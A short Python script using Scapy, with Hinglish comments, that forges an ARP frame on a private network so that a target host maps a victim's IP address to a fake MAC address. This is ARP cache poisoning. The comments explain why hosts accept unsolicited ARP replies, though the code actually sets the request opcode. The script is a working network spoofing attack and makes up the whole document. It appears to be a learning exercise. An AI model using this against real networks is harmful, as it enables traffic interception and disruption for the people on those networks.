#!/usr/bin/python3
from scapy.all import *
targetip = "192.168.43.246"
targetmac="08:00:27:3c:36:f7"
victimip="192.168.43.224"
fakemacforvictim="aa:bb:cc:dd:ee:ff"
print("SENDING SPOOFED ARP REPLY....")
#here we are going to send an arp reply to the target by determining us as a victim , actually agar target ke pass ke kisi ka ip na ho toh woh arp request behta ha
# hai ke yein ip jiska bhi ip ho woh bata de,now hum yaha par sidhe arp reply bhej rahe hai, because coputer arp reply accept kr leta hai bina soche smjhe, and arp 
# arp request bhenge toh woh arp relpy krega jo real one ke paas bhi jayega  
ether=Ether()
ether.dst=targetmac
ether.src=fakemacforvictim

arp=ARP()
arp.psrc=victimip
arp.hwsrc=fakemacforvictim
arp.pdst=targetip
arp.op=1
frame=ether/arp
sendp(frame)
